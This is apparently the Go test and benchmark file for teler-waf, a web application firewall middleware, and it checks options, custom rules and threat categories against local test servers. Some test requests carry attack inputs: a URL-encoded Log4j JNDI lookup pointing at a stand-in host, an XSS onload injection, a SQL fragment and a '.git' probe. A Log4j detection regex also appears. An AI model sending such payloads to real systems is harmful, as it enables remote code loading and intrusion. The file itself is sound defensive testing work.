// Copyright Dwi Siswanto and/or licensed to Dwi Siswanto under one
// or more contributor license agreements. Licensed under the Elastic License 2.0;
// you may not use this file except in compliance with the Elastic License 2.0.
// See the LICENSE-ELASTIC file in the project root for more information.

package teler

import (
	"bufio"
	"os"
	"strings"
	"testing"

	"net/http"
	"net/http/httptest"
	"path/filepath"

	"github.com/kitabisa/teler-waf/request"
	"github.com/kitabisa/teler-waf/threat"
	"github.com/stretchr/testify/assert"
)

// Prepraring handler for all cases
var (
	handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	client = &http.Client{}

	homeDir  string
	cacheDir = filepath.Join(".cache", "teler-waf")
)

var mockRawReq = `POST / HTTP/1.1
Host: example.com
Referrer: https://example.com/some/page
User-Agent: X
Content-Length: 9

some=body`

func init() {
	homeDir, _ = os.UserHomeDir()

	// Removing teler threat datasets
	err := os.RemoveAll(filepath.Join(homeDir, cacheDir))
	if err != nil {
		panic(err)
	}
}

func TestNewDefaultOptions(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	// Set the user agent to "X"
	req.Header.Set("User-Agent", "X")

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewWithNoStderr(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{NoStderr: true})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewWithNoUpdateCheck(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{NoStderr: true, NoUpdateCheck: true})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewWithLogFile(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{NoStderr: true, LogFile: "/dev/null"})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewWithDevelopment(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{NoStderr: true, Development: true})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewWithWhitelist(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Whitelists: []string{`request.Headers contains "Go-http-client"`},
		NoStderr:   true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewWithMalformedDataset(t *testing.T) {
	// Remove CVEs dataset
	cvesFile := filepath.Join(homeDir, cacheDir, "cves.json")
	if err := os.Remove(cvesFile); err != nil {
		panic(err)
	}

	// Initialize teler
	telerMiddleware := New(Options{NoStderr: true})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewWithInMemory(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{NoStderr: true, InMemory: true})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewWithFalcoSidekickURL(t *testing.T) {
	// Initialize Falco Sidekick handler
	falcoSidekickHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	// Initialize Falco Sidekick server
	falcoSidekickServer := httptest.NewServer(falcoSidekickHandler)
	defer falcoSidekickServer.Close()

	// Initialize teler
	telerMiddleware := New(Options{NoStderr: true, FalcoSidekickURL: falcoSidekickServer.URL})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewCustomsFromFile(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.CVE,
			threat.BadIPAddress,
			threat.BadReferrer,
			threat.BadCrawler,
			threat.DirectoryBruteforce,
		},
		CustomsFromFile: "tests/rules/valid/*.yaml",
		NoStderr:        true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	pathList := []string{"", "/?foo=select%20%2A%20from%20db"}

	for _, path := range pathList {
		// Create a request to send to the test server
		req, err := http.NewRequest("GET", ts.URL, nil)
		if err != nil {
			t.Fatal(err)
		}

		if path != "" {
			req.URL.Path = path
		}

		_, err = client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
	}
}

func TestNewCustoms(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.CVE,
			threat.BadIPAddress,
			threat.BadReferrer,
			threat.BadCrawler,
			threat.DirectoryBruteforce,
		},
		Customs: []Rule{
			{
				Name:      "And condition",
				Condition: "and",
				Rules: []Condition{
					{
						Element: request.Headers,
						Pattern: `Go-http-client`,
					},
					{
						Element: request.URI,
						Pattern: `.`,
					},
				},
			},
			{
				Name:      "Headers element",
				Condition: "and",
				Rules: []Condition{
					{
						Element: request.Headers,
						Pattern: `.`,
					},
				},
			},
			{
				Name:      "Body element",
				Condition: "and",
				Rules: []Condition{
					{
						Element: request.Headers,
						Pattern: `.`,
					},
				},
			},
			{
				Name:      "Any element",
				Condition: "and",
				Rules: []Condition{
					{
						Method:  request.GET,
						Element: request.Any,
						Pattern: `.`,
					},
				},
			},
		},
		NoStderr: true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	pathList := []string{"", "/?foo=bar%24%7Bjndi%3Aldap%3A%2F%2Fbad.host%2FbadClassName%7D"}

	for _, path := range pathList {
		// Create a request to send to the test server
		req, err := http.NewRequest("GET", ts.URL, nil)
		if err != nil {
			t.Fatal(err)
		}

		if path != "" {
			req.URL.Path = path
		}

		_, err = client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
	}
}

func TestNewCommonWebAttackOnly(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Excludes: []threat.Threat{
			threat.CVE,
			threat.BadIPAddress,
			threat.BadReferrer,
			threat.BadCrawler,
			threat.DirectoryBruteforce,
		},
		NoStderr: true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	pathList := []string{"", `/?foo=bar%22onload%3Dalert%28%29`}

	for _, path := range pathList {
		// Create a request to send to the test server
		req, err := http.NewRequest("GET", ts.URL, nil)
		if err != nil {
			t.Fatal(err)
		}

		if path != "" {
			req.URL.Path = path
		}

		_, err = client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
	}
}

func TestNewCVEOnly(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.BadIPAddress,
			threat.BadReferrer,
			threat.BadCrawler,
			threat.DirectoryBruteforce,
		},
		NoStderr: true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	// Set the request path to "/vcac/" (CVE-2022-22972)
	req.URL.Path = "/vcac/"

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewBadIPAddressOnly(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.CVE,
			threat.BadReferrer,
			threat.BadCrawler,
			threat.DirectoryBruteforce,
		},
		NoStderr: true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	// Set the custom header for X-Real-Ip
	req.Header.Set("X-Real-Ip", "1.14.77.81")

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewBadReferrerOnly(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.CVE,
			threat.BadIPAddress,
			threat.BadCrawler,
			threat.DirectoryBruteforce,
		},
		NoStderr: true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Define a list of referers to test
	refList := []string{"https://waf.teler.app/", "http://34.gs/"}

	// Loop over each endpoint path and send a request
	for _, ref := range refList {
		// Create a request to send to the test server
		req, err := http.NewRequest("GET", ts.URL, nil)
		if err != nil {
			t.Fatal(err)
		}

		// Set the HTTP referrer of the request
		req.Header.Set("Referer", ref)

		_, err = client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
	}
}

func TestNewBadCrawlerOnly(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.CVE,
			threat.BadIPAddress,
			threat.BadReferrer,
			threat.DirectoryBruteforce,
		},
		NoStderr: true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Define a list of user-agents to test
	uaList := []string{"", "Mozilla"}

	// Loop over each endpoint path and send a request
	for _, ua := range uaList {
		// Create a request to send to the test server
		req, err := http.NewRequest("GET", ts.URL, nil)
		if err != nil {
			t.Fatal(err)
		}

		if ua != "" {
			// Set the HTTP user-agent of the request
			req.Header.Set("User-Agent", ua)
		}

		_, err = client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
	}
}

func TestNewDirectoryBruteforceOnly(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.CVE,
			threat.BadIPAddress,
			threat.BadReferrer,
			threat.BadCrawler,
		},
		NoStderr: true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	// Set the request path
	req.URL.Path = "/.git"

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewWithResponseStatus(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Response: Response{
			Status: 501,
		},
		NoStderr: true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewWithResponseHTML(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Response: Response{
			HTML: "Your request has been denied for security reasons. Ref: {{ID}}.",
		},
		NoStderr: true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewWithResponseHTMLFile(t *testing.T) {
	// Initialize teler
	telerMiddleware := New(Options{
		Response: Response{
			HTMLFile: "examples/403.html",
		},
		NoStderr: true,
	})
	wrappedHandler := telerMiddleware.Handler(handler)

	// Create a test server with the wrapped handler
	ts := httptest.NewServer(wrappedHandler)
	defer ts.Close()

	// Create a request to send to the test server
	req, err := http.NewRequest("GET", ts.URL, nil)
	if err != nil {
		t.Fatal(err)
	}

	_, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
}

func TestNewInvalidWhitelist(t *testing.T) {
	defer func() {
		// Check that the teler function panics
		if r := recover(); r != nil {
			assert.Panics(t, func() { panic(r) })
		}
	}()

	// Initialize teler
	telerMiddleware := New(Options{
		Whitelists: []string{`XYZ matches "foo(?!bar)"`},
		NoStderr:   true,
	})

	telerMiddleware.Handler(handler)
}

func TestNewInvalidCustomRuleName(t *testing.T) {
	defer func() {
		// Check that the teler function panics
		if r := recover(); r != nil {
			assert.Panics(t, func() { panic(r) })
		}
	}()

	// Initialize teler
	telerMiddleware := New(Options{
		Customs: []Rule{
			{
				Name:      "",
				Condition: "or",
				Rules: []Condition{
					{
						Method:  request.GET,
						Element: request.URI,
						Pattern: `.`,
					},
				},
			},
		},
		NoStderr: true,
	})

	telerMiddleware.Handler(handler)
}

func TestNewInvalidCustomRuleName2(t *testing.T) {
	defer func() {
		// Check that the teler function panics
		if r := recover(); r != nil {
			assert.Panics(t, func() { panic(r) })
		}
	}()

	// Initialize teler
	telerMiddleware := New(Options{
		CustomsFromFile: "tests/rules/invalid/err-name.yaml",
		NoStderr:        true,
	})

	telerMiddleware.Handler(handler)
}

func TestNewInvalidCustomRuleCondition(t *testing.T) {
	defer func() {
		// Check that the teler function panics
		if r := recover(); r != nil {
			assert.Panics(t, func() { panic(r) })
		}
	}()

	// Initialize teler
	telerMiddleware := New(Options{
		Customs: []Rule{
			{
				Name:      "foo",
				Condition: "bar",
				Rules: []Condition{
					{
						Method:  request.GET,
						Element: request.URI,
						Pattern: `.`,
					},
				},
			},
		},
		NoStderr: true,
	})

	telerMiddleware.Handler(handler)
}

func TestNewInvalidCustomRuleCondition2(t *testing.T) {
	defer func() {
		// Check that the teler function panics
		if r := recover(); r != nil {
			assert.Panics(t, func() { panic(r) })
		}
	}()

	// Initialize teler
	telerMiddleware := New(Options{
		CustomsFromFile: "tests/rules/invalid/err-condition.yaml",
		NoStderr:        true,
	})

	telerMiddleware.Handler(handler)
}

func TestNewBlankCustomRulePattern(t *testing.T) {
	defer func() {
		// Check that the teler function panics
		if r := recover(); r != nil {
			assert.Panics(t, func() { panic(r) })
		}
	}()

	// Initialize teler
	telerMiddleware := New(Options{
		Customs: []Rule{
			{
				Name:      "foo",
				Condition: "or",
				Rules: []Condition{
					{
						Method:  request.GET,
						Element: request.URI,
						Pattern: "",
					},
				},
			},
		},
		NoStderr: true,
	})

	telerMiddleware.Handler(handler)
}

func TestNewBlankCustomRulePattern2(t *testing.T) {
	defer func() {
		// Check that the teler function panics
		if r := recover(); r != nil {
			assert.Panics(t, func() { panic(r) })
		}
	}()

	// Initialize teler
	telerMiddleware := New(Options{
		CustomsFromFile: "tests/rules/invalid/err-pattern.yaml",
		NoStderr:        true,
	})

	telerMiddleware.Handler(handler)
}

func TestNewInvalidCustomRulePattern(t *testing.T) {
	defer func() {
		// Check that the teler function panics
		if r := recover(); r != nil {
			assert.Panics(t, func() { panic(r) })
		}
	}()

	// Initialize teler
	telerMiddleware := New(Options{
		Customs: []Rule{
			{
				Name:      "foo",
				Condition: "or",
				Rules: []Condition{
					{
						Method:  request.GET,
						Element: request.URI,
						Pattern: `foo(?!bar)`,
					},
				},
			},
		},
		NoStderr: true,
	})

	telerMiddleware.Handler(handler)
}

func TestNewInvalidCustomRulePattern2(t *testing.T) {
	defer func() {
		// Check that the teler function panics
		if r := recover(); r != nil {
			assert.Panics(t, func() { panic(r) })
		}
	}()

	// Initialize teler
	telerMiddleware := New(Options{
		CustomsFromFile: "tests/rules/invalid/err-pattern-2.yaml",
		NoStderr:        true,
	})

	telerMiddleware.Handler(handler)
}

func TestNewInvalidCustomRuleMethod2(t *testing.T) {
	defer func() {
		// Check that the teler function panics
		if r := recover(); r != nil {
			assert.Panics(t, func() { panic(r) })
		}
	}()

	// Initialize teler
	telerMiddleware := New(Options{
		CustomsFromFile: "tests/rules/invalid/err-method.yaml",
		NoStderr:        true,
	})

	telerMiddleware.Handler(handler)
}

func TestNewInvalidCustomRuleElement2(t *testing.T) {
	defer func() {
		// Check that the teler function panics
		if r := recover(); r != nil {
			assert.Panics(t, func() { panic(r) })
		}
	}()

	// Initialize teler
	telerMiddleware := New(Options{
		CustomsFromFile: "tests/rules/invalid/err-element.yaml",
		NoStderr:        true,
	})

	telerMiddleware.Handler(handler)
}

func BenchmarkAnalyzeDefaultOptions(b *testing.B) {
	// Initialize teler
	waf := New()

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeCommonWebAttack(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.CVE,
			threat.BadIPAddress,
			threat.BadReferrer,
			threat.BadCrawler,
			threat.DirectoryBruteforce,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}

	// Run the benchmark
	// for _, req := range []int{1, 1000, 10000, 100000} {
	// 	b.Run(fmt.Sprintf("%d-requests", req), func(b *testing.B) {
	// 		b.ReportAllocs()
	// 		b.ResetTimer()
	// 		for i := 0; i < b.N; i++ {
	// 			for j := 0; j < req; j++ {
	// 				err := waf.Analyze(w, r)
	// 				if err != nil {
	// 					b.Fatal(err)
	// 				}
	// 			}
	// 		}
	// 	})
	// }
}

func BenchmarkAnalyzeCVE(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.BadIPAddress,
			threat.BadReferrer,
			threat.BadCrawler,
			threat.DirectoryBruteforce,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeBadIPAddress(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.CVE,
			threat.BadReferrer,
			threat.BadCrawler,
			threat.DirectoryBruteforce,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeBadReferrer(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.CVE,
			threat.BadIPAddress,
			threat.BadCrawler,
			threat.DirectoryBruteforce,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeBadCrawler(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.CVE,
			threat.BadIPAddress,
			threat.BadReferrer,
			threat.DirectoryBruteforce,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeDirectoryBruteforce(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.CVE,
			threat.BadIPAddress,
			threat.BadReferrer,
			threat.BadCrawler,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeCustomRule(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
			threat.CVE,
			threat.BadIPAddress,
			threat.BadReferrer,
			threat.BadCrawler,
			threat.DirectoryBruteforce,
		},
		Customs: []Rule{
			{
				Name:      "Log4j Attack",
				Condition: "or",
				Rules: []Condition{
					{
						Method:  request.GET,
						Element: request.URI,
						Pattern: `\$\{.*:\/\/.*\/?\w+?\}`,
					},
				},
			},
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeWithoutCommonWebAttack(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.CommonWebAttack,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeWithoutCVE(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.CVE,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeWithoutBadIPAddress(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.BadIPAddress,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeWithoutBadReferrer(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.BadReferrer,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeWithoutBadCrawler(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.BadCrawler,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkAnalyzeWithoutDirectoryBruteforce(b *testing.B) {
	// Initialize teler
	waf := New(Options{
		Excludes: []threat.Threat{
			threat.DirectoryBruteforce,
		},
	})

	r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(mockRawReq)))
	if err != nil {
		b.Fatal(err)
	}

	w := httptest.NewRecorder()

	// Run the benchmark
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := waf.Analyze(w, r)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func ExampleNew_default() {
	var myHandler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("hello world"))
	})

	telerMiddleware := New()

	app := telerMiddleware.Handler(myHandler)
	go func() {
		_ = http.ListenAndServe("127.0.0.1:3000", app)
	}()
}

func ExampleNew_setHandler() {
	var forbidden = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "We're sorry, but your request has been denied for security reasons.", http.StatusForbidden)
	})

	var myHandler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("hello world"))
	})

	telerMiddleware := New()
	telerMiddleware.SetHandler(forbidden)

	app := telerMiddleware.Handler(myHandler)
	go func() {
		_ = http.ListenAndServe("127.0.0.1:3000", app)
	}()
}

func ExampleNew_custom() {
	var myHandler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("hello world"))
	})

	telerMiddleware := New(Options{
		Excludes: []threat.Threat{
			threat.BadReferrer,
			threat.BadCrawler,
		},
		Whitelists: []string{
			`request.Headers matches "(curl|Go-http-client|okhttp)/*" && threat == BadCrawler`,
			`request.URI startsWith "/wp-login.php"`,
			`request.IP in ["127.0.0.1", "::1", "0.0.0.0"]`,
			`request.Headers contains "authorization" && request.Method == "POST"`,
		},
		Customs: []Rule{
			{
				Name:      "Log4j Attack",
				Condition: "or",
				Rules: []Condition{
					{
						Method: request.GET,
						// if Method is not set or invalid, defaulting to request.GET.
						Element: request.URI,
						// you can use request.Any: it useful when you want to
						// match against multiple elements of the request at once,
						// rather than just a single element.
						Pattern: `\$\{.*:\/\/.*\/?\w+?\}`,
					},
				},
			},
		},
		LogFile: "/tmp/teler.log",
	})

	app := telerMiddleware.Handler(myHandler)
	go func() {
		_ = http.ListenAndServe("127.0.0.1:3000", app)
	}()
}
